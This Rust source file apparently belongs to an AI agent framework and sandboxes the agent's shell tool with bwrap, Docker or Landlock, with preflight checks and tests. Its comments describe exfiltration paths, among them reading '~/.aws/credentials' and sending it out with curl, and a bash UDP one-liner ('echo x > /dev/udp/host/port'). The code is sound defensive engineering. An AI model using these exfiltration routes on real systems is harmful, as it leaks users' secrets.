//! Confining `shell`.
//!
//! Every other tool is bounded by [`ToolCtx::resolve`](crate::tool::ToolCtx),
//! which proves a path stays inside the workspace before touching it. `shell`
//! cannot work that way: the path jail cannot see inside `bash -c`, and a
//! command is free to `cd /`, read `~/.aws/credentials`, and `curl` it out.
//! The capability model has always said so — `shell` is marked
//! private + sends + destructive — but saying it is not enforcing it.
//!
//! This is the enforcement. A sandboxed `shell` gets the workspace and a
//! read-only system, no home directory, no environment, and by default no
//! network.
//!
//! ## The rule that matters
//!
//! **A configured sandbox that does not work must stop the run, never quietly
//! degrade.** Falling back to unconfined execution when `bwrap` is missing is
//! worse than having no sandbox at all: the operator believes commands are
//! confined and writes policy on that belief. So [`Sandbox::preflight`] runs a
//! real command through the real backend, and a failure is an error with
//! instructions rather than a warning.
//!
//! ## What this is not
//!
//! Not a security boundary against a determined kernel exploit. It is the
//! difference between "an injected command can read your SSH keys" and "an
//! injected command can read the files you pointed the agent at", which is the
//! difference that decides whether an agent can be woken by an email.

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

/// Push a run of arguments. A closure would borrow the vector for its whole
/// lifetime, which collides with the interleaved dynamic pushes below.
macro_rules! args {
    ($v:expr, $($s:expr),+ $(,)?) => {{ $( $v.push($s.to_string()); )+ }};
}

/// How commands are confined.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Backend {
    /// Run directly, as you, with your credentials. The historical behaviour,
    /// and the only sane default for a supervised CLI on a machine where the
    /// alternatives may not be installed.
    #[default]
    None,
    /// User namespaces via `bwrap`. Cheap — no daemon, a few milliseconds —
    /// and the right choice where unprivileged user namespaces are permitted.
    Bwrap,
    /// A throwaway container. Works where user namespaces are locked down,
    /// costs a container start per command.
    Docker,
    /// Landlock LSM rules applied to the child process itself — no wrapper
    /// binary, no namespaces, no daemon, and crucially **no privilege**: it
    /// works on Ubuntu 23.10+ where AppArmor blocks unprivileged user
    /// namespaces and `bwrap` fails even installed.
    ///
    /// The trade is scope, and it is not negotiable, so it is priced into
    /// the capability predicates rather than left to memory: Landlock
    /// confines *files* (kernel 6.2+ for a complete write story — rename,
    /// link, truncate). It cannot close the network — TCP bind/connect are
    /// deniable on kernel 6.7+ and are denied when `network = false`, but
    /// UDP is not restrictable at any ABI, and `echo x > /dev/udp/host/port`
    /// is a working exfiltration route in bash alone. So a landlocked
    /// `shell` **never earns the interlock relaxation**
    /// ([`Sandbox::can_reach_network`] stays true), and what the backend
    /// buys is the other half of the module's closing sentence: an injected
    /// command reads the files you pointed the agent at, not your SSH keys
    /// or `~/.mecha`. Weaker than `bwrap` in three more ways worth knowing:
    /// `/tmp` is shared rather than private, `/proc` shows every process,
    /// and there is no PID/IPC isolation.
    Landlock,
}

impl Backend {
    pub fn as_str(self) -> &'static str {
        match self {
            Backend::None => "none",
            Backend::Bwrap => "bwrap",
            Backend::Docker => "docker",
            Backend::Landlock => "landlock",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct SandboxConfig {
    pub kind: Backend,
    /// Let confined commands reach the network.
    ///
    /// Off by default, and this is the single most valuable line in the file:
    /// with it off, `shell` stops being an exfiltration route, which is what
    /// lets the trifecta interlock relax rather than tighten.
    pub network: bool,
    /// Extra paths mounted writable, on top of the workspace.
    pub writable: Vec<PathBuf>,
    /// Extra paths mounted read-only. Use for a toolchain or a cache that
    /// lives outside the workspace.
    pub readable: Vec<PathBuf>,
    /// Environment variables passed through by name. Nothing else survives —
    /// an allowlist, because the interesting variables are the secret ones.
    pub env: Vec<String>,
    /// Container image for the `docker` backend.
    pub image: String,
    /// Memory ceiling in megabytes (`docker` only).
    pub memory_mb: Option<u64>,
    /// CPU ceiling (`docker` only), e.g. `2.0`.
    pub cpus: Option<f64>,
}

impl Default for SandboxConfig {
    fn default() -> Self {
        SandboxConfig {
            kind: Backend::None,
            network: false,
            writable: Vec::new(),
            readable: Vec::new(),
            env: Vec::new(),
            // Small, ubiquitous, and has a shell and coreutils. Anything the
            // agent actually needs to build with should be a different image.
            image: "debian:stable-slim".into(),
            memory_mb: None,
            cpus: None,
        }
    }
}

#[derive(Debug, Clone, Default)]
pub struct Sandbox {
    cfg: SandboxConfig,
}

impl Sandbox {
    pub fn new(cfg: SandboxConfig) -> Self {
        Sandbox { cfg }
    }

    pub fn backend(&self) -> Backend {
        self.cfg.kind
    }

    /// The same policy with the network decided differently.
    ///
    /// Exists because network is otherwise one switch for everything, and the
    /// common case wants them split: a third-party MCP server that has to reach
    /// its own API, confined, while `shell` still has no way out. Sharing one
    /// flag would mean opening `shell` to satisfy the server.
    pub fn with_network(&self, network: bool) -> Self {
        Sandbox {
            cfg: SandboxConfig {
                network,
                ..self.cfg.clone()
            },
        }
    }

    pub fn is_enabled(&self) -> bool {
        self.cfg.kind != Backend::None
    }

    /// Can a confined command still reach off this machine?
    ///
    /// This is what decides whether `shell` counts as an `external_send` sink.
    /// Unconfined, it always can. Confined without network, it cannot — and the
    /// interlock should stop treating it as a way out, because it isn't one.
    pub fn can_reach_network(&self) -> bool {
        match self.cfg.kind {
            Backend::None => true,
            // Landlock cannot close the network, only narrow it: TCP
            // bind/connect are denied where the kernel supports it (6.7+),
            // but UDP is not restrictable at any ABI, and bash alone can
            // send over it. A partial restriction must never earn the
            // interlock relaxation — the answer here is what `shell`'s
            // `external_send` believes, and believing a hole closed because
            // it narrowed is the silently-degrading-sandbox shape.
            Backend::Landlock => true,
            _ => self.cfg.network,
        }
    }

    /// Can a confined command read data outside the workspace?
    ///
    /// Unconfined it reads your whole home directory. Confined it sees the
    /// workspace and a read-only system — the same reach `fs_read` already has,
    /// which is classified `private` on the same reasoning.
    pub fn reaches_beyond_workspace(&self) -> bool {
        !self.is_enabled() || !self.cfg.writable.is_empty() || !self.cfg.readable.is_empty()
    }

    /// Build the process that will run `command`.
    ///
    /// `workspace` is mounted writable; `cwd` must be inside it — the caller has
    /// already proved that through `ToolCtx::resolve`.
    pub fn command(
        &self,
        command: &str,
        workspace: &Path,
        cwd: &Path,
    ) -> Result<tokio::process::Command> {
        match self.cfg.kind {
            Backend::None => {
                let mut c = tokio::process::Command::new("bash");
                c.arg("-lc").arg(command).current_dir(cwd);
                Ok(c)
            }
            _ => self.wrap_argv("bash", &["-lc".into(), command.into()], workspace, cwd),
        }
    }

    /// Confine an explicit argv, with no shell in between.
    ///
    /// For long-lived children — an MCP server — where routing through
    /// `bash -lc` would mean quoting caller-supplied arguments correctly, and
    /// getting that wrong is a command-injection bug rather than a typo.
    pub fn wrap_argv(
        &self,
        program: &str,
        args: &[String],
        workspace: &Path,
        cwd: &Path,
    ) -> Result<tokio::process::Command> {
        match self.cfg.kind {
            Backend::None => {
                let mut c = tokio::process::Command::new(program);
                c.args(args).current_dir(cwd);
                Ok(c)
            }
            Backend::Bwrap => {
                let mut c = tokio::process::Command::new("bwrap");
                c.args(self.bwrap_args(workspace, cwd)?);
                c.arg("--").arg(program).args(args);
                Ok(c)
            }
            Backend::Docker => {
                let mut c = tokio::process::Command::new("docker");
                c.args(self.docker_args(workspace, cwd)?);
                c.arg(program).args(args);
                Ok(c)
            }
            Backend::Landlock => self.landlock_command(program, args, workspace, cwd),
        }
    }

    /// Landlock has no wrapper argv: the rules are applied *in the child*,
    /// between fork and exec. Two disciplines carry the arm:
    ///
    /// - **Everything that allocates happens in the parent.** The ruleset —
    ///   path descriptors, syscally but heap-using construction — is built
    ///   here; the `pre_exec` closure runs post-fork in a process whose heap
    ///   may hold another thread's lock, so it makes raw syscalls only
    ///   (`restrict_self` is a `prctl` plus one landlock syscall).
    /// - **Enforcement is checked where it happens.** `restrict_self` reports
    ///   what the kernel actually enforced, and `NotEnforced` fails the spawn
    ///   rather than running the command unconfined — the per-call form of
    ///   the preflight rule.
    #[cfg(target_os = "linux")]
    fn landlock_command(
        &self,
        program: &str,
        args: &[String],
        workspace: &Path,
        cwd: &Path,
    ) -> Result<tokio::process::Command> {
        use landlock::RulesetStatus;

        let workspace = absolute(workspace)?;
        let ruleset = self.landlock_ruleset(&workspace)?;

        let mut c = tokio::process::Command::new(program);
        c.args(args).current_dir(absolute(cwd)?);

        // The same environment discipline as bwrap: nothing survives unless
        // named. HOME is the workspace, so `~` expansion lands somewhere the
        // rules allow — the real home is denied wholesale below.
        c.env_clear();
        c.env(
            "PATH",
            "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        );
        c.env("HOME", workspace.as_os_str());
        for name in &self.cfg.env {
            if let Ok(value) = std::env::var(name) {
                c.env(name, value);
            }
        }

        let mut ruleset = Some(ruleset);
        unsafe {
            c.pre_exec(move || {
                // `take()` mutates the child's copy-on-write memory only, so
                // a Command spawned twice hands each child a live ruleset.
                let rs = ruleset
                    .take()
                    .ok_or_else(|| std::io::Error::other("landlock ruleset already consumed"))?;
                let status = rs.restrict_self().map_err(std::io::Error::other)?;
                if status.ruleset == RulesetStatus::NotEnforced {
                    return Err(std::io::Error::other(
                        "the kernel did not enforce the landlock ruleset",
                    ));
                }
                Ok(())
            });
        }
        Ok(c)
    }

    #[cfg(not(target_os = "linux"))]
    fn landlock_command(
        &self,
        _program: &str,
        _args: &[String],
        _workspace: &Path,
        _cwd: &Path,
    ) -> Result<tokio::process::Command> {
        anyhow::bail!("the landlock sandbox is Linux-only; use `kind = \"docker\"` here")
    }

    /// The policy, as a ready-to-apply ruleset.
    ///
    /// Filesystem access is a **hard requirement at ABI 3** (kernel 6.2):
    /// below that the kernel cannot restrict truncation (or, below 2,
    /// rename-and-link), which is a write hole wide enough to make the
    /// confinement a fiction — better to refuse than to half-work, exactly
    /// as with a `bwrap` that cannot create namespaces. The TCP denial is
    /// best-effort on top (ABI 4, kernel 6.7): a real narrowing worth
    /// having, and *not* load-bearing, because `can_reach_network` never
    /// credits it.
    #[cfg(target_os = "linux")]
    fn landlock_ruleset(&self, workspace: &Path) -> Result<landlock::RulesetCreated> {
        use landlock::{
            Access, AccessFs, AccessNet, CompatLevel, Compatible, PathBeneath, PathFd, Ruleset,
            RulesetAttr, RulesetCreatedAttr, ABI,
        };

        let abi = ABI::V3;
        let read = AccessFs::from_read(abi);
        let full = AccessFs::from_all(abi);

        let base = Ruleset::default()
            .set_compatibility(CompatLevel::HardRequirement)
            .handle_access(full)
            .context("this kernel cannot enforce the landlock file policy (needs 6.2+)")?;
        let mut created = if self.cfg.network {
            base.create()
        } else {
            base.set_compatibility(CompatLevel::BestEffort)
                .handle_access(AccessNet::BindTcp | AccessNet::ConnectTcp)
                .context("declaring the TCP restriction")?
                .create()
        }
        .context("creating the landlock ruleset")?;

        // The system, readable and executable — the same set bwrap binds
        // read-only, plus /run because /etc/resolv.conf is usually a symlink
        // into it. A path that does not exist contributes no rule, exactly
        // like `--ro-bind-try`.
        for dir in [
            "/usr", "/etc", "/opt", "/bin", "/sbin", "/lib", "/lib32", "/lib64", "/proc", "/run",
        ] {
            if let Ok(fd) = PathFd::new(dir) {
                created = created.add_rule(PathBeneath::new(fd, read))?;
            }
        }
        for path in &self.cfg.readable {
            if let Ok(fd) = PathFd::new(path) {
                created = created.add_rule(PathBeneath::new(fd, read))?;
            }
        }

        // Writable: the workspace (an error if unopenable — confining a
        // command to a workspace that does not exist is a configuration
        // problem, not a rule to skip), extra writable paths, /dev for the
        // sinks everything needs (`/dev/null` first), and /tmp — shared, not
        // private; the honest cost of having no mount namespace, and one of
        // the documented ways this backend is weaker than bwrap.
        created = created.add_rule(PathBeneath::new(
            PathFd::new(workspace)
                .with_context(|| format!("opening the workspace {}", workspace.display()))?,
            full,
        ))?;
        for path in &self.cfg.writable {
            if let Ok(fd) = PathFd::new(path) {
                created = created.add_rule(PathBeneath::new(fd, full))?;
            }
        }
        for dir in ["/dev", "/tmp"] {
            if let Ok(fd) = PathFd::new(dir) {
                created = created.add_rule(PathBeneath::new(fd, full))?;
            }
        }

        Ok(created)
    }

    /// The environment a child should get, given a passthrough allowlist.
    ///
    /// Inheriting mecha's environment hands a third-party process every secret
    /// you have exported — provider keys first among them. So the rule is the
    /// same as inside the sandbox: a minimal base, plus what was named.
    ///
    /// `HOME` and `PATH` are in the base because without them most runtimes
    /// (node, python) cannot find their own modules, and a server that cannot
    /// start teaches the operator to turn this off.
    pub fn child_env(passthrough: &[String]) -> Vec<(String, String)> {
        const BASE: [&str; 5] = ["PATH", "HOME", "LANG", "LC_ALL", "TZ"];

        BASE.iter()
            .map(|s| s.to_string())
            .chain(passthrough.iter().cloned())
            .filter_map(|name| std::env::var(&name).ok().map(|v| (name, v)))
            .collect()
    }

    /// Arguments up to (but not including) the command itself. Split out so the
    /// policy can be asserted on in tests without spawning anything.
    pub fn bwrap_args(&self, workspace: &Path, cwd: &Path) -> Result<Vec<String>> {
        let mut a: Vec<String> = Vec::new();

        // `--die-with-parent` so a wedged command cannot outlive mecha.
        // `--new-session` detaches the controlling terminal, which blocks the
        // TIOCSTI trick of pushing characters into the parent's input queue.
        args!(
            a,
            "--die-with-parent",
            "--new-session",
            "--unshare-user",
            "--unshare-pid",
            "--unshare-ipc",
            "--unshare-uts",
            "--unshare-cgroup-try",
        );
        if !self.cfg.network {
            args!(a, "--unshare-net");
        }

        // The system, read-only. `/bin`, `/lib` and friends are symlinks into
        // `/usr` on merged systems and real directories on older ones, so ask
        // rather than assume — binding a symlink as a directory fails.
        for dir in ["/usr", "/etc", "/opt"] {
            if Path::new(dir).is_dir() {
                args!(a, "--ro-bind-try", dir, dir);
            }
        }
        for dir in ["/bin", "/sbin", "/lib", "/lib32", "/lib64"] {
            match std::fs::symlink_metadata(dir) {
                Ok(meta) if meta.file_type().is_symlink() => {
                    let target = std::fs::read_link(dir)?;
                    args!(a, "--symlink", target.to_string_lossy(), dir);
                }
                Ok(_) => args!(a, "--ro-bind-try", dir, dir),
                Err(_) => {}
            }
        }

        // A private /tmp, so a command cannot leave anything behind for the
        // next one or read what the last one left.
        args!(a, "--proc", "/proc", "--dev", "/dev", "--tmpfs", "/tmp");

        for path in &self.cfg.readable {
            args!(a, "--ro-bind-try", path.display(), path.display());
        }

        let workspace = absolute(workspace)?;
        args!(a, "--bind", workspace.display(), workspace.display());
        for path in &self.cfg.writable {
            args!(a, "--bind-try", path.display(), path.display());
        }

        args!(a, "--chdir", absolute(cwd)?.display());

        // Nothing from the parent environment survives unless it is named.
        // API keys live in the environment; a confined command that inherits
        // them is confined in the least interesting way.
        args!(
            a,
            "--clearenv",
            "--setenv",
            "PATH",
            "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            "--setenv",
            "HOME",
            workspace.display(),
        );
        for name in &self.cfg.env {
            if let Ok(value) = std::env::var(name) {
                args!(a, "--setenv", name, value);
            }
        }

        Ok(a)
    }

    /// Arguments up to (but not including) the command itself.
    pub fn docker_args(&self, workspace: &Path, cwd: &Path) -> Result<Vec<String>> {
        let workspace = absolute(workspace)?;
        let mut a: Vec<String> = Vec::new();
        args!(a, "run", "--rm", "-i");

        args!(
            a,
            "--network",
            if self.cfg.network { "bridge" } else { "none" }
        );

        // Root inside a container writing into a bind-mounted workspace leaves
        // root-owned files behind on the host, which the user then cannot
        // delete. Run as the caller.
        #[cfg(unix)]
        {
            let (uid, gid) = unsafe { (libc::getuid(), libc::getgid()) };
            args!(a, "--user", format!("{uid}:{gid}"));
        }

        args!(
            a,
            "--security-opt",
            "no-new-privileges",
            "--cap-drop",
            "ALL"
        );

        if let Some(mb) = self.cfg.memory_mb {
            args!(a, "--memory", format!("{mb}m"));
        }
        if let Some(cpus) = self.cfg.cpus {
            args!(a, "--cpus", cpus);
        }

        for path in &self.cfg.readable {
            args!(a, "-v", format!("{}:{}:ro", path.display(), path.display()));
        }
        args!(
            a,
            "-v",
            format!("{}:{}", workspace.display(), workspace.display())
        );
        for path in &self.cfg.writable {
            args!(a, "-v", format!("{}:{}", path.display(), path.display()));
        }

        args!(a, "-w", absolute(cwd)?.display());

        for name in &self.cfg.env {
            if let Ok(value) = std::env::var(name) {
                args!(a, "-e", format!("{name}={value}"));
            }
        }

        args!(a, self.cfg.image);
        Ok(a)
    }

    /// Prove the sandbox actually works, by running something through it.
    ///
    /// Called once at startup rather than on the first tool call, so a
    /// misconfiguration is a clear message at launch instead of a confusing
    /// tool error twenty turns into a run.
    pub async fn preflight(&self, workspace: &Path) -> Result<()> {
        if !self.is_enabled() {
            return Ok(());
        }

        let marker = "mecha-sandbox-ok";
        let mut command = self
            .command(&format!("echo {marker}"), workspace, workspace)
            .context("building the sandbox command")?;

        let output = tokio::time::timeout(
            std::time::Duration::from_secs(60),
            command.stdin(std::process::Stdio::null()).output(),
        )
        .await
        .map_err(|_| anyhow::anyhow!("the {} sandbox timed out starting", self.cfg.kind.as_str()))?
        .with_context(|| {
            format!(
                "cannot run `{}` — is it installed?",
                match self.cfg.kind {
                    Backend::Docker => "docker",
                    // Landlock spawns bash directly; what fails here is the
                    // ruleset in pre_exec, not a missing wrapper binary.
                    Backend::Landlock => "bash",
                    _ => "bwrap",
                }
            )
        })?;

        if output.status.success() && String::from_utf8_lossy(&output.stdout).contains(marker) {
            self.prove_landlock_containment(workspace).await?;
            return Ok(());
        }

        let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
        anyhow::bail!(
            "the {} sandbox does not work here: {}{}",
            self.cfg.kind.as_str(),
            if stderr.is_empty() {
                "no output".into()
            } else {
                stderr.clone()
            },
            diagnose(self.cfg.kind, &stderr)
        )
    }

    /// The half of the landlock preflight `echo` cannot cover.
    ///
    /// A working `echo` proves the ruleset *applied*; it does not prove the
    /// rules deny anything, and "confined" with nothing denied is the state
    /// this file exists to forbid. So plant a file in the real home — which
    /// is precisely what this backend claims to protect — and require the
    /// confined command to fail to read it. Skipped only where it would be
    /// vacuous: no home, an unwritable home, or a home inside the workspace,
    /// each of which leaves nothing to prove rather than something unproven.
    async fn prove_landlock_containment(&self, workspace: &Path) -> Result<()> {
        if self.cfg.kind != Backend::Landlock {
            return Ok(());
        }
        let Some(home) = dirs::home_dir() else {
            return Ok(());
        };
        let probe = home.join(format!(".mecha-landlock-probe-{}", uuid::Uuid::new_v4()));
        let ws = workspace
            .canonicalize()
            .unwrap_or_else(|_| workspace.to_path_buf());
        if probe.starts_with(&ws) {
            return Ok(());
        }
        if std::fs::write(&probe, "canary").is_err() {
            return Ok(());
        }

        let read = async {
            let mut command = self
                .command(&format!("cat '{}'", probe.display()), workspace, workspace)
                .context("building the containment probe")?;
            let out = command
                .stdin(std::process::Stdio::null())
                .output()
                .await
                .context("running the containment probe")?;
            anyhow::Ok(out.status.success())
        }
        .await;
        std::fs::remove_file(&probe).ok();

        if read? {
            anyhow::bail!(
                "the landlock sandbox is not actually confining: a confined command read \
                 {} — a file outside every rule. Refusing to run with decorative \
                 confinement; use `kind = \"bwrap\"` or `\"docker\"`, and please report \
                 this.",
                probe.display()
            );
        }
        Ok(())
    }
}

/// Whether this kernel can enforce the file policy the landlock backend
/// requires (Landlock ABI 3, kernel 6.2+). For tests and any surface that
/// wants to suggest the backend only where it would preflight. Creating a
/// ruleset restricts nothing — the fd is dropped unapplied.
pub fn landlock_supported() -> bool {
    #[cfg(target_os = "linux")]
    {
        use landlock::{Access, AccessFs, CompatLevel, Compatible, Ruleset, RulesetAttr, ABI};
        Ruleset::default()
            .set_compatibility(CompatLevel::HardRequirement)
            .handle_access(AccessFs::from_all(ABI::V3))
            .and_then(|r| r.create())
            .is_ok()
    }
    #[cfg(not(target_os = "linux"))]
    false
}

/// Turn a backend's error into something the operator can act on.
///
/// The Ubuntu 24.04 case is the one worth spelling out: `bwrap` is installed,
/// `unprivileged_userns_clone` is 1, and it still fails, because AppArmor
/// gained a separate switch that nothing mentions.
fn diagnose(kind: Backend, stderr: &str) -> String {
    match kind {
        Backend::Bwrap if stderr.contains("uid map") || stderr.contains("user namespace") => {
            "\n\nUnprivileged user namespaces are blocked. On Ubuntu 23.10+ this is \
             usually AppArmor rather than the kernel:\n  \
             sysctl kernel.apparmor_restrict_unprivileged_userns   # 1 means blocked\n\
             Either install an AppArmor profile for bwrap, or set \
             `kernel.apparmor_restrict_unprivileged_userns=0` (system-wide, weaker), \
             or use `kind = \"docker\"` instead."
                .into()
        }
        Backend::Bwrap if stderr.contains("loopback") => {
            "\n\nbwrap could not configure loopback in the new network namespace. \
             Set `network = true` to share the host's, or use `kind = \"docker\"`."
                .into()
        }
        Backend::Docker if stderr.contains("permission denied") => {
            "\n\nThe docker socket is not accessible. Add yourself to the `docker` \
             group, or use `kind = \"bwrap\"`."
                .into()
        }
        Backend::Docker => {
            "\n\nCheck the image exists (`docker pull <image>`) and the daemon is running.".into()
        }
        Backend::Landlock => "\n\nLandlock needs the LSM enabled on a 6.2+ kernel: `cat \
             /sys/kernel/security/lsm` should include `landlock`. Where it is \
             unavailable, use `kind = \"bwrap\"` or `\"docker\"`."
            .into(),
        _ => String::new(),
    }
}

fn absolute(path: &Path) -> Result<PathBuf> {
    path.canonicalize()
        .with_context(|| format!("cannot resolve {}", path.display()))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(kind: Backend) -> SandboxConfig {
        SandboxConfig {
            kind,
            ..SandboxConfig::default()
        }
    }

    #[test]
    fn a_disabled_sandbox_runs_bash_directly() {
        let sandbox = Sandbox::new(cfg(Backend::None));
        assert!(!sandbox.is_enabled());
        // Nothing is confined, so every capability `shell` declares still holds.
        assert!(sandbox.can_reach_network());
        assert!(sandbox.reaches_beyond_workspace());
    }

    #[test]
    fn confinement_without_network_closes_the_exfiltration_route() {
        let sandbox = Sandbox::new(cfg(Backend::Bwrap));
        assert!(!sandbox.can_reach_network());
        assert!(!sandbox.reaches_beyond_workspace());

        // ...and asking for the network opens it again. This is the whole
        // basis for relaxing the interlock, so it must not be sloppy.
        let sandbox = Sandbox::new(SandboxConfig {
            network: true,
            ..cfg(Backend::Bwrap)
        });
        assert!(sandbox.can_reach_network());
    }

    /// The single most load-bearing fact about the landlock backend: it
    /// never earns the interlock relaxation, because UDP stays open at every
    /// ABI. If this test starts failing, someone made a partial network
    /// restriction count as a closed one — the exact bug the backend's
    /// design forbids.
    #[test]
    fn landlock_never_earns_the_network_narrowing() {
        let sandbox = Sandbox::new(cfg(Backend::Landlock));
        assert!(sandbox.is_enabled());
        assert!(
            sandbox.can_reach_network(),
            "a landlocked shell must stay an external_send sink"
        );
        // Even asked for explicitly: `network = false` narrows TCP where the
        // kernel can, and still must not read as a closed network.
        let explicit = Sandbox::new(SandboxConfig {
            network: false,
            ..cfg(Backend::Landlock)
        });
        assert!(explicit.can_reach_network());
    }

    #[test]
    fn a_bind_outside_the_workspace_is_still_reach_beyond_it() {
        let sandbox = Sandbox::new(SandboxConfig {
            readable: vec![PathBuf::from("/opt/toolchain")],
            ..cfg(Backend::Bwrap)
        });
        assert!(
            sandbox.reaches_beyond_workspace(),
            "an extra bind is exactly how private data gets back in reach"
        );
    }

    #[test]
    fn bwrap_confines_the_environment_and_the_network() {
        let workspace = std::env::temp_dir();
        let args = Sandbox::new(cfg(Backend::Bwrap))
            .bwrap_args(&workspace, &workspace)
            .unwrap();

        assert!(
            args.contains(&"--unshare-net".into()),
            "no network by default"
        );
        assert!(
            args.contains(&"--clearenv".into()),
            "the parent env must not leak"
        );
        assert!(args.contains(&"--unshare-user".into()));
        assert!(args.contains(&"--die-with-parent".into()));
        // Blocks TIOCSTI input injection into the parent's terminal.
        assert!(args.contains(&"--new-session".into()));

        // The workspace is the only writable bind.
        let workspace = workspace.canonicalize().unwrap();
        let binds: Vec<_> = args
            .iter()
            .enumerate()
            .filter(|(_, a)| *a == "--bind")
            .map(|(i, _)| args[i + 1].clone())
            .collect();
        assert_eq!(binds, vec![workspace.display().to_string()]);
    }

    #[test]
    fn network_is_shared_only_when_asked_for() {
        let workspace = std::env::temp_dir();
        let args = Sandbox::new(SandboxConfig {
            network: true,
            ..cfg(Backend::Bwrap)
        })
        .bwrap_args(&workspace, &workspace)
        .unwrap();
        assert!(!args.contains(&"--unshare-net".into()));
    }

    #[test]
    fn docker_drops_privileges_and_the_network() {
        let workspace = std::env::temp_dir();
        let args = Sandbox::new(cfg(Backend::Docker))
            .docker_args(&workspace, &workspace)
            .unwrap();

        assert_eq!(args[0], "run");
        assert!(
            args.contains(&"--rm".into()),
            "containers must not accumulate"
        );
        assert!(args
            .windows(2)
            .any(|w| w[0] == "--network" && w[1] == "none"));
        assert!(args
            .windows(2)
            .any(|w| w[0] == "--cap-drop" && w[1] == "ALL"));
        assert!(args
            .windows(2)
            .any(|w| w[0] == "--security-opt" && w[1] == "no-new-privileges"));
        // Running as root would leave root-owned files in the user's workspace.
        assert!(args.iter().any(|a| a == "--user"));
    }

    #[test]
    fn a_child_inherits_only_the_base_and_what_was_named() {
        // The leak this closes: `Command::envs()` adds to the inherited
        // environment rather than replacing it, so an MCP server used to start
        // holding every provider key mecha had. Nothing crosses now unless the
        // config named it.
        std::env::set_var("MECHA_TEST_TOKEN", "sk-should-not-cross");
        std::env::set_var("MECHA_TEST_WANTED", "fine");

        let names: Vec<String> = Sandbox::child_env(&["MECHA_TEST_WANTED".into()])
            .into_iter()
            .map(|(k, _)| k)
            .collect();

        assert!(names.contains(&"MECHA_TEST_WANTED".to_string()));
        assert!(
            !names.contains(&"MECHA_TEST_TOKEN".to_string()),
            "an unnamed variable must not reach a third-party process"
        );
        // PATH and HOME are the base: without them most runtimes cannot start,
        // and a server that will not start teaches people to turn this off.
        assert!(names.contains(&"PATH".to_string()));
        assert!(names.contains(&"HOME".to_string()));
    }

    #[test]
    fn wrapping_an_argv_does_not_route_through_a_shell() {
        // A server's args are config, but quoting them into `bash -lc` would
        // still be a command-injection bug waiting for one entry with a space.
        let workspace = std::env::temp_dir();
        let sandbox = Sandbox::new(cfg(Backend::Bwrap));
        let command = sandbox
            .wrap_argv(
                "node",
                &["server.js".into(), "--flag with space".into()],
                &workspace,
                &workspace,
            )
            .unwrap();

        let argv: Vec<_> = command
            .as_std()
            .get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect();
        assert!(
            !argv.iter().any(|a| a == "-lc"),
            "no shell should be involved"
        );
        assert!(
            argv.contains(&"--flag with space".to_string()),
            "args stay one argv entry"
        );
    }

    #[test]
    fn only_named_environment_variables_cross_the_boundary() {
        std::env::set_var("MECHA_TEST_ALLOWED", "yes");
        std::env::set_var("MECHA_TEST_SECRET", "no");

        let workspace = std::env::temp_dir();
        let sandbox = Sandbox::new(SandboxConfig {
            env: vec!["MECHA_TEST_ALLOWED".into()],
            ..cfg(Backend::Bwrap)
        });
        let args = sandbox.bwrap_args(&workspace, &workspace).unwrap();

        assert!(args.contains(&"MECHA_TEST_ALLOWED".into()));
        assert!(
            !args.iter().any(|a| a == "MECHA_TEST_SECRET" || a == "no"),
            "an unlisted variable must not cross"
        );
    }
}
